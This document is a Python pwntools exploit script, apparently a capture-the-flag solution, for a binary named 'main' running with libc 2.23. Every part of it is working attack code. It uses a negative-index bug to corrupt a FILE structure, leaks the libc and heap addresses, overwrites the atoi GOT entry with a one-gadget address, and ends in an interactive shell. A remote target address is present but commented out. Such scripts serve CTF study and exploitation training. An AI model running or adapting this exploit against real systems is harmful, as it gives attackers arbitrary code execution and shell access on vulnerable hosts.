from pwn import*
def create():
	p.sendlineafter('choice>>','1')
	p.sendafter('name:','FMYY')
def spell(index,name):
	p.sendlineafter('choice>>','2')
	p.sendlineafter('spell:',str(index))
	p.sendafter('name:',name)
def leave():
	p.sendlineafter('choice>>','4')
def gift(index):
	p.sendlineafter('choice>>','3')
	p.sendlineafter('chance:',str(index))
#context.log_level ='DEBUG'
#p = remote('159.138.137.79',52449)
p = process('./main')
elf = ELF('./main',checksec=False)
libc = ELF('./libc-2.23.so',checksec=False)
create()
spell(0,'\x00')		#init the log_FILE
#-----------		#Control the write_ptr point the fron of log_FILE
for i in range(8):
	spell(-2,'\x00')
spell(-2,'\x00'*13)
for i in range(3):
	spell(-2,'\x00')
spell(-2,'\x00'*9)
spell(-2,'\x00')
#-----------
spell(0,'\x00'*3 + p64(0x231))
spell(0,p64(0xFBAD1800) + p64(elf.got['atoi']))
libc_base = u64(p.recv(8)) - libc.sym['atoi']
system = libc_base + libc.sym['system']
rce = libc_base + 0xF1147
#-----------
spell(-2,p64(0)*3) 		#return the front of log_FILE
spell(0,'\x00'*2 + p64(0x231))
spell(0,p64(0xFBAD1800) + p64(0x6020E0) + p64(0x6020E0 + 0x50) + p64(0))	#leak the heap_base
log_FILE = u64(p.recv(8)) - 0x10
log.info('LOG:\t' + hex(log_FILE))
spell(0,p64(log_FILE +0x100)*3) #satisfy _IO_write_ptr <_IO_buf_base < _IO_write_end
spell(0,p64(elf.got['atoi']+ 0x78 + 23) + p64(elf.got['atoi'] + 0x100)) #modify the _IO_buf_base and _IO_buf_end
#-----------make the _IO_write_ptr = atoi_got - 1
spell(-2,'\x00')
spell(-2,'\x00'*3)
spell(-2,'\x00'*4)
#-----------
spell(0,p64(rce))
p.sendlineafter('choice>>','sh\x00')

p.interactive()

